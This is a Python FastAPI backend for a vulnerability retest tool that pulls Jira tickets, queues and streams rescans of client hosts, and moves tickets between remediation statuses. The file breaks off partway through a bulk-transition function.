import asyncio
import calendar
import ipaddress
import json
import logging
import os
import queue as _queue_mod
import random
import re
import sys
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import io
import tempfile
from datetime import date, datetime, timedelta
from logging.handlers import RotatingFileHandler
from typing import Dict, List, Optional

from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.responses import FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from .config import load_config
from .jira_client import JiraClient
from .jira_client_v2 import JiraClientV2
from . import scanner, connections

LOG_DIR = "data/logs"
os.makedirs(LOG_DIR, exist_ok=True)


def _resource_path(*parts: str) -> str:
    """
    Resolve a path to a bundled read-only resource (e.g. frontend/).

    • Normal run: path is relative to the project root (parent of src/).
    • PyInstaller frozen build: bundled files live in sys._MEIPASS; writable
      files (config/, data/) stay relative to the executable directory via
      os.chdir() in run.py — so they never need this helper.
    """
    if getattr(sys, "frozen", False):
        base = sys._MEIPASS  # type: ignore[attr-defined]
    else:
        base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, *parts)

# Console: WARNING+ only (clean terminal — errors/warnings surface immediately)
# File:    INFO+    (full detail for debugging)
_console_handler = logging.StreamHandler()
_console_handler.setLevel(logging.WARNING)
_console_handler.setFormatter(logging.Formatter("%(levelname)s %(name)s: %(message)s"))

_file_handler = RotatingFileHandler(
    os.path.join(LOG_DIR, "nemesis.log"),
    maxBytes=5_000_000,
    backupCount=5,
    encoding="utf-8",
)
_file_handler.setLevel(logging.INFO)
_file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))

logging.basicConfig(level=logging.INFO, handlers=[_console_handler, _file_handler])

# Suppress uvicorn's per-request access log in the terminal (still goes to file)
logging.getLogger("uvicorn.access").setLevel(logging.WARNING)
log = logging.getLogger(__name__)

CONFIG_PATH = "config/config.yaml"

if os.path.exists(CONFIG_PATH):
    cfg = load_config(CONFIG_PATH)
    # Constructing the clients no longer performs any network I/O, so import (and
    # therefore uvicorn startup) is instant even if Jira is slow/unreachable.
    jira = JiraClient(cfg.jira)
    jira_secondary = JiraClientV2(cfg.jira_secondary) if cfg.jira_secondary else None

    def _warm_jira_field_maps():
        """Load the Jira field maps in the background so the first poll uses the
        minimal (fast) field list without blocking app startup."""
        for client in (jira, jira_secondary):
            if client is None:
                continue
            try:
                client._load_fields()
            except Exception:
                pass  # lazy _fid() will retry later; startup must never block

    threading.Thread(target=_warm_jira_field_maps, daemon=True).start()
else:
    cfg = None
    jira = None
    jira_secondary = None
    log.warning("No %s found — serving first-run Settings page until setup completes.", CONFIG_PATH)

# Active session: "axian" | "non_axian"
active_session: str = "axian"

app = FastAPI(title="Nemesis")
app.mount("/static", StaticFiles(directory=_resource_path("frontend")), name="static")

# ── Batch-scan streaming state ─────────────────────────────────────────────
_BATCH_QUEUES:  dict = {}   # scan_id → queue.Queue
_BATCH_CANCELS: dict = {}   # scan_id → threading.Event
_BATCH_LOCK = threading.Lock()

from . import setup as setup_mod
app.include_router(setup_mod.router)

from . import settings_api
app.include_router(settings_api.router)

from . import shell_ws
app.include_router(shell_ws.router)

from . import tunnel_api
app.include_router(tunnel_api.router)

from . import intake as intake_mod
app.include_router(intake_mod.router)

_poller_thread: Optional[threading.Thread] = None
_poller_thread_secondary: Optional[threading.Thread] = None
_reload_lock = threading.Lock()


def _jira_for_label(label: str):
    """Return the Jira client that owns this client label."""
    if jira_secondary and cfg.clients_secondary and any(c.label == label for c in cfg.clients_secondary):
        return jira_secondary
    return jira


def _jira_for_job(job: dict):
    """Return the Jira client that owns this job's ticket."""
    if job.get("session") == "non_axian" and jira_secondary:
        return jira_secondary
    return jira


def _get_client(label: str):
    """Find a ClientConfig by label across both sessions. Returns (client, session)."""
    c = next((c for c in cfg.clients if c.label == label), None)
    if c:
        return c, "axian"
    c = next((c for c in (cfg.clients_secondary or []) if c.label == label), None)
    if c:
        return c, "non_axian"
    return None, None


def _find_client(label: str):
    """Return ClientConfig for label from either primary or secondary clients, or None."""
    client_cfg, _ = _get_client(label)
    return client_cfg


def _start_poller_thread():
    global _poller_thread, _poller_thread_secondary
    # All active client labels across both sessions
    all_clients = list(cfg.clients) + list(cfg.clients_secondary or [])
    current_labels = {c.label for c in all_clients}
    with connections._lock:
        # Remove any clients that no longer exist in config
        for stale in [lbl for lbl in list(connections._status) if lbl not in current_labels]:
            conn = connections._pool.pop(stale, None)
            del connections._status[stale]
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
        # Seed clients as disconnected if not already tracked
        for c in all_clients:
            connections._status.setdefault(c.label, "disconnected")

    # Primary (Axian) poller
    t = threading.Thread(target=scanner.poll_jira, args=(cfg,), daemon=True)
    t.start()
    _poller_thread = t

    # Secondary (Non-Axian) poller — only if configured
    if cfg.jira_secondary and cfg.clients_secondary:
        t2 = threading.Thread(target=scanner.poll_jira_secondary, args=(cfg,), daemon=True)
        t2.start()
        _poller_thread_secondary = t2


@app.on_event("startup")
def _start_poller():
    if not os.path.exists(CONFIG_PATH):
        return
    _start_poller_thread()
    scanner._app_log("Retest Tool API ready")


def reload_runtime_config():
    """Re-read config.yaml and swap in fresh Jira clients + poller threads,
    so a Settings save takes effect immediately without restarting the app."""
    global cfg, jira, jira_secondary
    with _reload_lock:
        # Stop both pollers
        scanner._poll_stop.set()
        scanner._wake_poll.set()
        scanner._poll_stop_secondary.set()
        scanner._wake_poll_secondary.set()
        if _poller_thread is not None:
            _poller_thread.join(timeout=10)
        if _poller_thread_secondary is not None:
            _poller_thread_secondary.join(timeout=10)

        cfg = load_config(CONFIG_PATH)
        jira = JiraClient(cfg.jira)
        jira_secondary = JiraClientV2(cfg.jira_secondary) if cfg.jira_secondary else None

        scanner._poll_stop.clear()
        scanner._poll_stop_secondary.clear()
        _start_poller_thread()
        scanner._app_log("Configuration reloaded — Jira clients and pollers restarted with new settings")


# ── Static / UI ────────────────────────────────────────────────────────────

_NO_CACHE = {"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache"}

@app.get("/")
def index():
    if not os.path.exists(CONFIG_PATH):
        return FileResponse(_resource_path("frontend", "setup.html"), headers=_NO_CACHE)
    return FileResponse(_resource_path("frontend", "index.html"), headers=_NO_CACHE)


@app.get("/setup-preview")
def setup_preview():
    """Always serve the first-run setup wizard (for docs / screenshots)."""
    return FileResponse(_resource_path("frontend", "setup.html"), headers=_NO_CACHE)


@app.post("/api/setup/activate")
def setup_activate():
    """Called by setup.html after config.yaml has been written.
    Starts the reload in a background thread and returns immediately so the
    browser redirect is never blocked by Jira initialisation time."""
    if not os.path.exists(CONFIG_PATH):
        raise HTTPException(400, "config.yaml not found — complete setup first.")
    import threading
    threading.Thread(target=reload_runtime_config, daemon=True).start()
    return {"ok": True}

@app.get("/static/app.js")
def serve_app_js():
    return FileResponse(_resource_path("frontend", "app.js"), headers=_NO_CACHE)

@app.get("/static/style.css")
def serve_style_css():
    return FileResponse(_resource_path("frontend", "style.css"), headers=_NO_CACHE)

@app.get("/static/setup.js")
def serve_setup_js():
    return FileResponse(_resource_path("frontend", "setup.js"), headers=_NO_CACHE)

@app.get("/static/intake.js")
def serve_intake_js():
    return FileResponse(_resource_path("frontend", "intake.js"), headers=_NO_CACHE)


# ── Config ─────────────────────────────────────────────────────────────────

@app.get("/api/config")
def get_config():
    if active_session == "non_axian" and cfg.jira_secondary:
        return {"retest_status": cfg.jira_secondary.retest_status}
    return {"retest_status": cfg.jira.retest_status}


# ── Session switching ───────────────────────────────────────────────────────

class SessionRequest(BaseModel):
    session: str  # "axian" | "non_axian"


@app.get("/api/session")
def get_session():
    return {
        "active": active_session,
        "non_axian_configured": bool(
            cfg and cfg.jira_secondary
            and cfg.jira_secondary.url
            and cfg.jira_secondary.api_token
            and cfg.clients_secondary
        ),
    }


@app.post("/api/session")
def set_session(req: SessionRequest):
    global active_session
    if req.session not in ("axian", "non_axian"):
        raise HTTPException(400, "session must be 'axian' or 'non_axian'")
    if req.session == "non_axian":
        if not (cfg and cfg.jira_secondary and cfg.jira_secondary.url and cfg.jira_secondary.api_token):
            raise HTTPException(400, "Non-Axian Jira is not configured yet — add it in Settings first.")
        if not cfg.clients_secondary:
            raise HTTPException(400, "No Non-Axian clients configured — add them in Settings first.")
    active_session = req.session
    scanner._app_log(f"Session switched to: {active_session}")
    return {"ok": True, "active": active_session}


# ── Clients ────────────────────────────────────────────────────────────────

@app.get("/api/clients")
def list_clients():
    clients = cfg.clients if active_session == "axian" else (cfg.clients_secondary or [])
    return [{"label": c.label, "name": c.name} for c in clients]


# ── Jobs ───────────────────────────────────────────────────────────────────

# Fields needed to render the job list/cards. Excludes heavy per-job data
# (output_lines, ticket_description, nmap_command, ticket_cves) which only
# matter for the single selected job's detail view — fetched separately via
# GET /api/jobs/{job_id}. At sweep scale (1000+ jobs) sending the full dict
# for every job on every 5s poll was a multi-MB payload that froze the UI.
_SLIM_JOB_FIELDS = [
    "id", "ticket_key", "ticket_summary", "ticket_status", "ticket_cvss",
    "ticket_severity", "ticket_technology", "client_label", "ip", "port",
    "rule_name", "scan_tool", "status", "verdict", "verdict_reason",
    "created_at", "completed_at", "jira_updated", "source",
    "triage", "triage_note", "session",
]


@app.get("/api/jobs")
def list_jobs():
    with scanner._lock:
        return [
            {k: job.get(k) for k in _SLIM_JOB_FIELDS}
            for job in scanner.JOBS.values()
            if job.get("session", "axian") == active_session
        ]


# ── Static job sub-routes MUST be registered before /{job_id} ─────────────
# FastAPI matches routes in registration order; without this, "transition-preview"
# would be captured by the /{job_id} parameter route and return 404.

@app.get("/api/jobs/transition-preview")
def transition_preview():
    to_fixed, to_not_fixed = _bulk_transition_candidates()
    def _slim(job):
        return {
            "job_id":         job["id"],
            "ticket_key":     job["ticket_key"],
            "ticket_summary": job["ticket_summary"],
            "ticket_status":  job.get("ticket_status", ""),
            "client_label":   job["client_label"],
        }
    return {
        "to_fixed":     [_slim(j) for j in to_fixed],
        "to_not_fixed": [_slim(j) for j in to_not_fixed],
    }


def _not_fixed_scan_jobs(client_label: Optional[str] = None) -> List[dict]:
    """Completed scans with verdict not_fixed — for export / colleague handoff."""
    with scanner._lock:
        jobs = list(scanner.JOBS.values())
    results = []
    for job in jobs:
        if job.get("session", "axian") != active_session:
            continue
        if job["status"] != "completed" or job.get("verdict") != "not_fixed":
            continue
        if client_label and job.get("client_label") != client_label:
            continue
        results.append({
            "job_id": job["id"],
            "ticket_key": job["ticket_key"],
            "ticket_summary": job.get("ticket_summary", ""),
            "ticket_status": job.get("ticket_status", ""),
            "client_label": job.get("client_label", ""),
            "ip": job.get("ip"),
            "port": job.get("port"),
            "verdict_reason": job.get("verdict_reason", ""),
        })
    results.sort(key=lambda j: j["ticket_key"])
    return results


@app.get("/api/jobs/not-fixed-keys")
def not_fixed_keys(client_label: Optional[str] = None, format: str = "json"):
    """Return issue keys for all completed not_fixed scans.

    ?format=csv  → plain newline-separated keys (easy paste into Jira/Excel)
    ?format=json → structured list (default)
    """
    jobs = _not_fixed_scan_jobs(client_label)
    keys = [j["ticket_key"] for j in jobs]
    if format.lower() == "csv":
        from fastapi.responses import PlainTextResponse
        return PlainTextResponse("\n".join(keys) + ("\n" if keys else ""))
    return {
        "count": len(keys),
        "keys": keys,
        "keys_csv": ", ".join(keys),
        "jobs": jobs,
    }


@app.post("/api/jobs/stop-all")
def stop_all_jobs():
    result = scanner.cancel_all_active()
    return {"ok": True, **result}


@app.post("/api/jobs/stop-triage")
def stop_triage_jobs(client_label: Optional[str] = None):
    result = scanner.cancel_all_triage(client_label)
    return {"ok": True, **result}


def _triage_fixed_candidates(client_label: Optional[str] = None) -> List[dict]:
    """Queued jobs flagged 'likely fixed' by triage (port closed) — no full
    scan run on these. Used for the fast triage→transition shortcut."""
    with scanner._lock:
        jobs = list(scanner.JOBS.values())
    return [
        job for job in jobs
        if job["status"] == "queued"
        and job.get("triage") == "closed"
        and (not client_label or job["client_label"] == client_label)
    ]


@app.get("/api/jobs/triage-transition-preview")
def triage_transition_preview(client_label: Optional[str] = None):
    candidates = _triage_fixed_candidates(client_label)
    return {
        "to_fixed": [
            {
                "job_id": j["id"],
                "ticket_key": j["ticket_key"],
                "ticket_summary": j["ticket_summary"],
                "client_label": j["client_label"],
            }
            for j in candidates
        ]
    }


@app.get("/api/jobs/{job_id}")
def get_job(job_id: str):
    # Return a snapshot taken under the lock. The scan worker mutates the live
    # job dict (appending to output_lines etc.) from another thread; serializing
    # the live object could raise "changed size during iteration" mid-response.
    with scanner._lock:
        job = scanner.JOBS.get(job_id)
        if not job:
            raise HTTPException(404, "Job not found")
        snapshot = dict(job)
        snapshot["output_lines"] = list(job.get("output_lines") or [])
    return snapshot


@app.post("/api/jobs/{job_id}/scan")
def start_scan(job_id: str):
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    if job["status"] not in ("queued", "error"):
        raise HTTPException(400, f"Cannot scan — job status is '{job['status']}'")
    with scanner._lock:
        job["status"] = "queued"
        job["error"] = None
        job["verdict"] = None
        job["verdict_reason"] = None
        job["completed_at"] = None
    scanner.trigger_scan(job_id, cfg)
    return {"ok": True, "job_id": job_id}


from pydantic import BaseModel


class ScanBatchRequest(BaseModel):
    job_ids: List[str]


@app.post("/api/jobs/scan-batch")
def scan_batch(body: ScanBatchRequest):
    """Enqueue multiple jobs for scanning in one request.
    The backend worker processes them sequentially, one at a time.
    Allows enqueuing queued or errored jobs; others are skipped."""
    enqueued = 0
    skipped = 0
    enqueued_ids: List[str] = []
    for job_id in body.job_ids:
        job = scanner.JOBS.get(job_id)
        if not job or job["status"] not in ("queued", "error"):
            skipped += 1
            continue
        with scanner._lock:
            job["status"] = "queued"
            job["error"] = None
            job["verdict"] = None
            job["verdict_reason"] = None
            job["completed_at"] = None
        scanner.trigger_scan(job_id, cfg)
        enqueued += 1
        enqueued_ids.append(job_id)
    scanner._app_log(f"[Scan Batch] Enqueued {enqueued} jobs ({skipped} skipped)")
    return {"ok": True, "enqueued": enqueued, "skipped": skipped, "enqueued_ids": enqueued_ids}


@app.post("/api/jobs/resume-worker")
def resume_worker(client_label: str):
    """Resume a paused scan worker after SSH reconnection."""
    with scanner._lock:
        scanner._worker_paused[client_label] = False
    scanner._app_log(f"[SYSTEM] Worker for {client_label} resumed.")
    return {"ok": True}


@app.post("/api/jobs/{job_id}/triage")
def start_triage(job_id: str):
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    if job["status"] != "queued":
        raise HTTPException(400, f"Cannot triage — job status is '{job['status']}'")
    scanner.trigger_triage(job_id, cfg)
    return {"ok": True, "job_id": job_id}


@app.delete("/api/jobs/{job_id}")
def remove_job(job_id: str):
    """Remove a job from the queue and allow its ticket to be re-queued on next poll."""
    # Do the check-and-delete atomically under the lock; a concurrent poll cleanup
    # or transition could otherwise remove the job between the check and the del,
    # raising KeyError → 500.
    with scanner._lock:
        job = scanner.JOBS.pop(job_id, None)
        if not job:
            raise HTTPException(404, "Job not found")
        scanner.SEEN_KEYS.discard(job["ticket_key"])
    scanner._app_log(f"Removed: {job['ticket_key']} removed from queue")
    return {"ok": True}


@app.post("/api/jobs/{job_id}/stop")
def stop_scan_job(job_id: str):
    """Signal a running scan to stop."""
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    if job["status"] != "scanning":
        raise HTTPException(400, f"Job is not scanning (status: {job['status']})")
    scanner.stop_scan(job_id)
    return {"ok": True}


@app.post("/api/jobs/{job_id}/reset")
def reset_job(job_id: str):
    """Reset a completed/error job back to queued so it can be re-scanned."""
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    with scanner._lock:
        job["status"] = "queued"
        job["verdict"] = None
        job["verdict_reason"] = None
        job["output_lines"] = []
        job["error"] = None
        job["completed_at"] = None
        job["jira_updated"] = False
        job["triage"] = None
        job["triage_note"] = None
    return {"ok": True}


# ── Live scan output stream (SSE) ──────────────────────────────────────────

@app.get("/api/jobs/{job_id}/stream")
async def stream_output(job_id: str):
    async def generate():
        last = 0
        while True:
            job = scanner.JOBS.get(job_id)
            if not job:
                yield f"data: {json.dumps({'error': 'Job not found'})}\n\n"
                break

            lines = job.get("output_lines", [])
            if len(lines) > last:
                for line in lines[last:]:
                    yield f"data: {json.dumps({'line': line})}\n\n"
                last = len(lines)

            if job["status"] in ("completed", "error"):
                yield f"data: {json.dumps({'done': True, 'verdict': job.get('verdict'), 'reason': job.get('verdict_reason')})}\n\n"
                break

            await asyncio.sleep(0.3)

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


# ── Manual ticket add ──────────────────────────────────────────────────────

class AddTicketsRequest(BaseModel):
    keys: List[str]
    client_label: str


@app.post("/api/tickets/add")
def add_tickets(req: AddTicketsRequest):
    """Fetch one or more tickets from Jira by key and queue them for scanning,
    regardless of their current Jira status."""
    client_cfg, client_session = _get_client(req.client_label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client label: {req.client_label}")
    jira_client = _jira_for_label(req.client_label)

    results = []
    for raw in req.keys:
        key = raw.strip().upper()
        if not key:
            continue
        with scanner._lock:
            already_queued = key in scanner.SEEN_KEYS
            existing = next(
                (j for j in scanner.JOBS.values() if j["ticket_key"] == key), None
            ) if already_queued else None
        if already_queued:
            results.append({
                "key": key, "status": "already_queued",
                "summary": existing["ticket_summary"] if existing else "",
            })
            continue
        try:
            ticket = jira_client.get_ticket(key)
            # Re-check under the lock after the (slow) network fetch: the poller
            # could have queued this same key while we were fetching. Claim the
            # key atomically so we never create a duplicate job.
            with scanner._lock:
                if key in scanner.SEEN_KEYS:
                    results.append({"key": key, "status": "already_queued", "summary": ticket.get("summary", "")})
                    continue
                scanner.SEEN_KEYS.add(key)
            job_id = scanner._queue_ticket(ticket, req.client_label, source="manual", session=client_session, cfg=cfg)
            rule = scanner.JOBS[job_id].get("rule_name")
            scanner._app_log(
                f"Manual add: {key} ({req.client_label}) | "
                f"IP: {scanner.JOBS[job_id].get('ip')} | Rule: {rule or 'none'}"
            )
            results.append({
                "key": key, "status": "queued", "job_id": job_id,
                "summary": ticket["summary"], "rule": rule,
            })
        except Exception as exc:
            log.warning("Manual add failed for %s: %s", key, exc)
            results.append({"key": key, "status": "error", "error": str(exc)})

    return {"results": results}


# ── Jira transitions ───────────────────────────────────────────────────────

def _apply_transition_comment(
    jira_client,
    ticket_key: str,
    comment: Optional[str],
    screenshot_bytes: Optional[bytes] = None,
    screenshot_name: str = "screenshot.png",
    screenshot_mime: str = "image/png",
) -> None:
    """Upload optional screenshot and post Jira comment (with thumbnail markup)."""
    text = (comment or "").strip()
    attach_name = None
    if screenshot_bytes:
        attach_name = jira_client.add_attachment(
            ticket_key, screenshot_name, screenshot_bytes, screenshot_mime
        )
    if not text and not attach_name:
        return
    body = text
    if attach_name:
        embed = f"!{attach_name}|thumbnail!"
        body = f"{body}\n\n{embed}".strip() if body else embed
    jira_client.add_comment(ticket_key, body)


class SweepRunRequest(BaseModel):
    filter_rules: Optional[List[str]] = None  # None = queue all matching rules


@app.post("/api/transition")
async def transition_ticket(
    job_id: str = Form(...),
    to_status: str = Form(...),
    comment: Optional[str] = Form(None),
    screenshot: Optional[UploadFile] = File(None),
):
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")

    screenshot_bytes = None
    screenshot_name = "screenshot.png"
    screenshot_mime = "image/png"
    if screenshot:
        raw = await screenshot.read()
        if raw:
            screenshot_bytes = raw
            screenshot_name = screenshot.filename or screenshot_name
            screenshot_mime = screenshot.content_type or screenshot_mime

    ticket_key = job["ticket_key"]
    jira_client = _jira_for_job(job)
    try:
        # Transition first, then comment — so we never leave a "verified fixed"
        # comment on a ticket whose transition actually failed.
        jira_client.transition(ticket_key, to_status)
        _apply_transition_comment(
            jira_client, ticket_key, comment,
            screenshot_bytes, screenshot_name, screenshot_mime,
        )
        # Remove job immediately — don't wait for poll to clean it up.
        # Jira's search index lags after a transition, so the poll would
        # still see the ticket as Remediated and leave it in the queue.
        with scanner._lock:
            scanner.JOBS.pop(job_id, None)
            scanner.SEEN_KEYS.discard(ticket_key)
        scanner._app_log(f"Jira updated: {ticket_key} → {to_status} (removed from queue)")
        return {"ok": True, "ticket": ticket_key, "status": to_status}
    except Exception as exc:
        import traceback
        traceback.print_exc()
        scanner._app_log(f"Transition error: {exc}")
        raise HTTPException(500, str(exc))


@app.post("/api/jobs/{job_id}/fast-track")
async def fast_track_ticket(
    job_id: str,
    target: str = Form(...),
    comment: Optional[str] = Form(None),
    screenshot: Optional[UploadFile] = File(None),
):
    """
    Two-phase fast-track.

    Phase 1 (ticket not yet at retest/Remediated status):
      Advance to Remediated using the right intermediate chain, then STOP.
      Returns {ok, partial:true, current_status, message} — job stays on board.

    Phase 2 (ticket already at Remediated):
      Apply target (Fixed / Not Fixed) directly.
      Returns {ok, partial:false, chain} — job removed from board.

    No comment is ever posted on Jira if any transition fails.
    """
    job = scanner.JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")

    screenshot_bytes = None
    screenshot_name = "screenshot.png"
    screenshot_mime = "image/png"
    if screenshot:
        raw = await screenshot.read()
        if raw:
            screenshot_bytes = raw
            screenshot_name = screenshot.filename or screenshot_name
            screenshot_mime = screenshot.content_type or screenshot_mime

    ticket_key   = job["ticket_key"]
    jira_client  = _jira_for_job(job)
    retest_status = jira_client.cfg.retest_status   # e.g. "Remediated"

    current_status = (job.get("ticket_status") or "").strip()
    at_remediated  = current_status.lower() == retest_status.lower()

    # Phase 1 → advance to Remediated; Phase 2 → go to final target
    effective_target = target if at_remediated else retest_status

    try:
        completed = jira_client.fast_track(ticket_key, effective_target, comment="")
        _apply_transition_comment(
            jira_client, ticket_key, comment,
            screenshot_bytes, screenshot_name, screenshot_mime,
        )

        if not at_remediated:
            # Phase 1 complete — update cached status, keep job on board
            with scanner._lock:
                if job_id in scanner.JOBS:
                    scanner.JOBS[job_id]["ticket_status"] = retest_status
            scanner._app_log(
                f"Fast-track phase 1: {ticket_key} → {' → '.join(completed)} "
                f"[now {retest_status}]"
            )
            return {
                "ok": True,
                "partial": True,
                "ticket": ticket_key,
                "chain": completed,
                "current_status": retest_status,
                "message": (
                    f"Ticket moved to {retest_status}. "
                    f"Click again to mark as {target}."
                ),
            }
        else:
            # Phase 2 complete — remove job
            with scanner._lock:
                scanner.JOBS.pop(job_id, None)
                scanner.SEEN_KEYS.discard(ticket_key)
            scanner._app_log(
                f"Fast-track phase 2: {ticket_key} → {' → '.join(completed)}"
            )
            return {"ok": True, "partial": False, "ticket": ticket_key, "chain": completed}

    except Exception as exc:
        completed = getattr(exc, "completed", [])
        raise HTTPException(500, {
            "detail": str(exc),
            "completed": completed,
        })


@app.post("/api/sweep/advance")
def sweep_advance():
    """
    Advance swept tickets whose scan completed with a FIXED verdict and that are
    not yet at the retest (Remediated) Jira status.

    Only completed+fixed tickets are eligible — scanning, queued, manual, and
    tickets with any other verdict (not_fixed, inconclusive, error) are skipped.
    Tickets already at Remediated are also skipped.

    Returns {ok, succeeded:[...], failed:[...], skipped:[...]}
    """
    retest_status = cfg.jira.retest_status  # "Remediated"

    # Snapshot candidates so we don't iterate while modifying.
    # Only include jobs that:
    #   • come from the sweep section
    #   • have a completed scan with verdict == "fixed"
    #   • are not already at Remediated in Jira
    candidates = [
        j for j in list(scanner.JOBS.values())
        if j.get("source") == "sweep"
        and j.get("status") == "completed"
        and j.get("verdict") == "fixed"
        and (j.get("ticket_status") or "").lower() != retest_status.lower()
    ]

    succeeded: list = []
    failed:    list = []
    skipped:   list = []

    def _advance(job):
        jid = job["id"]
        key = job["ticket_key"]
        jira_client  = _jira_for_job(job)
        rs = jira_client.cfg.retest_status
        current = (job.get("ticket_status") or "").lower().strip()

        if current == rs.lower():
            skipped.append({"ticket_key": key, "reason": "already at Remediated"})
            return
        try:
            completed = jira_client.fast_track(key, rs)
            with scanner._lock:
                if jid in scanner.JOBS:
                    scanner.JOBS[jid]["ticket_status"] = rs
            scanner._app_log(
                f"Sweep advance: {key} → {' → '.join(completed)} [now {rs}]"
            )
            succeeded.append({"ticket_key": key, "chain": completed})
        except Exception as exc:
            partial = getattr(exc, "completed", [])
            scanner._app_log(f"[ERROR] Sweep advance: {key}: {exc}")
            failed.append({
                "ticket_key": key,
                "error": str(exc),
                "completed": partial,
            })

    with ThreadPoolExecutor(max_workers=6) as pool:
        futures = [pool.submit(_advance, j) for j in candidates]
        for f in as_completed(futures):
            f.result()

    scanner._app_log(
        f"Sweep advance complete: {len(succeeded)} advanced, "
        f"{len(failed)} failed, {len(skipped)} skipped"
    )
    return {"ok": True, "succeeded": succeeded, "failed": failed, "skipped": skipped}



# ── Bulk fast-track ───────────────────────────────────────────────────────

class BulkFastTrackRequest(BaseModel):
    job_ids: List[str]
    target: str  # "Remediated" (phase 1) or "Fixed" / "Not Fixed" (phase 2)


@app.post("/api/jobs/bulk-fast-track")
def bulk_fast_track_jobs(req: BulkFastTrackRequest):
    """
    Fast-track a list of jobs toward *target* using the same two-phase logic
    as the single-ticket fast-track endpoint.

    Phase 1 — ticket is NOT yet at Remediated:
        Run the intermediate chain then stop at Remediated.
        Job stays on the board with ticket_status updated to Remediated.
        Response: partial=True, current_status="Remediated".

    Phase 2 — ticket IS already at Remediated:
        Transition directly to *target* (Fixed / Not Fixed).
        Job is removed from the board.
        Response: partial=False.
    """
    succeeded: list = []
    failed: list = []

    # Terminal Jira states — ticket is fully resolved, no more transitions needed
    _TERMINAL = {"fixed", "not fixed", "risk accepted", "closed", "done"}

    def _do(job_id: str):
        job = scanner.JOBS.get(job_id)
        if not job:
            failed.append({"job_id": job_id, "error": "Job not found"})
            return
        key = job["ticket_key"]
        jira_client = _jira_for_job(job)
        retest = jira_client.cfg.retest_status
        current = (job.get("ticket_status") or "").strip()
        at_remediated = current.lower() == retest.lower()
        effective_target = req.target if at_remediated else retest

        try:
            completed = jira_client.fast_track(key, effective_target)

            # Fetch live status: an intermediate may have jumped the ticket past the
            # declared target (e.g. Fix Issue → Fixed when target was Remediated).
            try:
                live = jira_client.get_ticket(key)
                actual_status = (live.get("status") or effective_target).strip()
            except Exception:
                actual_status = effective_target

            # Phase 1 (not yet at Remediated): keep job on board so the user
            # can do phase 2 (→ Fixed / Not Fixed).  Only remove early if an
            # intermediate jumped the ticket PAST Remediated to a different
            # terminal state (e.g. Fix Issue → Fixed).
            # Phase 2 (was already at Remediated): remove when at target or
            # any terminal.
            if at_remediated:
                is_done = (
                    actual_status.lower() == req.target.lower()
                    or actual_status.lower() in _TERMINAL
                )
            else:
                # Jumped past Remediated to a different terminal (e.g. → Fixed)?
                is_done = (
                    actual_status.lower() in _TERMINAL
                    and actual_status.lower() != retest.lower()
                )

            with scanner._lock:
                if is_done:
                    # Ticket fully resolved — remove from board
                    scanner.JOBS.pop(job_id, None)
                    scanner.SEEN_KEYS.discard(key)
                elif job_id in scanner.JOBS:
                    # Phase 1 complete — update cached status, keep on board
                    scanner.JOBS[job_id]["ticket_status"] = actual_status or retest

            scanner._app_log(
                f"Bulk fast-track: {key} → {' → '.join(completed)} [now {actual_status}]"
            )
            succeeded.append({
                "job_id": job_id,
                "ticket_key": key,
                "chain": completed,
                "partial": not is_done,
                "current_status": actual_status,
            })
        except Exception as exc:
            partial_chain = getattr(exc, "completed", [])
            scanner._app_log(f"[ERROR] Bulk fast-track: {key}: {exc}")
            failed.append({
                "job_id": job_id,
                "ticket_key": key,
                "error": str(exc),
                "completed": partial_chain,
            })

    with ThreadPoolExecutor(max_workers=6) as pool:
        futures = [pool.submit(_do, jid) for jid in req.job_ids]
        for f in as_completed(futures):
            f.result()

    scanner._app_log(
        f"Bulk fast-track complete: {len(succeeded)} advanced, {len(failed)} failed"
    )
    return {"ok": True, "succeeded": succeeded, "failed": failed}


# ── Bulk transition ────────────────────────────────────────────────────────

def _bulk_transition_candidates():
    """
    Return (to_fixed, to_not_fixed) job lists based on verdict + ticket status.

    Rules:
      verdict=fixed     → always transition to Fixed
      verdict=not_fixed + ticket was Remediated → transition to Not Fixed
      verdict=not_fixed + ticket was Open       → skip (already correct state)
      verdict=inconclusive / error              → skip
    """
    to_fixed, to_not_fixed = [], []
    with scanner._lock:
        jobs = list(scanner.JOBS.values())
    for job in jobs:
        if job["status"] != "completed" or job.get("jira_updated"):
            continue
        verdict = job.get("verdict")
        # Resolve the retest status per the job's own session (Axian vs
        # Non-Axian may name it differently), and compare case-insensitively.
        retest = _jira_for_job(job).cfg.retest_status or ""
        ticket_status = job.get("ticket_status", "") or ""
        if verdict == "fixed":
            to_fixed.append(job)
        elif verdict == "not_fixed" and ticket_status.strip().lower() == retest.strip().lower():
            to_not_fixed.append(job)
    return to_fixed, to_not_fixed


class TriageTransitionRequest(BaseModel):
    client_label: Optional[str] = None
    comment: Optional[str] = None


@app.post("/api/jobs/triage-transition-bulk")
def triage_transition_bulk(req: TriageTransitionRequest):
    """Bulk-transition triage-flagged 'likely fixed' tickets straight to Fixed.
    No full scan is run — the human reviews the ticket list in the confirm
    modal before this is called, which is the required confirmation step."""
    candidates = _triage_fixed_candidates(req.client_label)
    succeeded, failed = [], []

    def _do(job):
        key = job["ticket_key"]
        # Use the session-correct client (Axian vs Non-Axian). Previously this
        # hardcoded the global Axian `jira`, so Non-Axian tickets hit the wrong
        # Jira instance (wrong base URL/auth → error or wrong-ticket action).
        jira_client = _jira_for_job(job)
        try:
            # Transition first, comment only after it succeeds.
            jira_client.transition(key, "Fixed")
            if req.comment:
                jira_client.add_comment(key, req.comment)
